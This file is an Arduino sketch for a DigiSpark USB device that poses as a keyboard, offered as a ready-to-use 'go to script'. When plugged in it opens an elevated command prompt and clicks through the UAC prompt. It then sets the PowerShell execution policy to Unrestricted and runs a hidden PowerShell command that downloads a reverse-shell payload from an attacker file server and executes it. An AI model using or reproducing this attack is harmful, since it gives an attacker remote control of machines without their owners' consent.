/*
My simple go to script to get it all started. Remember to change the [FILESERVER] URL to your machines server URL where the payload is hosted.
*/

#include "DigiKeyboard.h"
void setup() {}

void loop() {
    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(2500);
    
    /* Enable Running Scripts in Powershell.*/
    DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(750);
    DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
    DigiKeyboard.delay(750);
    DigiKeyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(750);
    DigiKeyboard.print("exit");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(750);

    /* Download Reverse Shell Payload */
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(750);
    DigiKeyboard.print("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('[FILE_SERVER]/payload.ps1');\""); // Download payload from fileserver and execute.
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(2000);

    for (;;) {
        /*Stops the digispark from running the scipt again*/
    }
}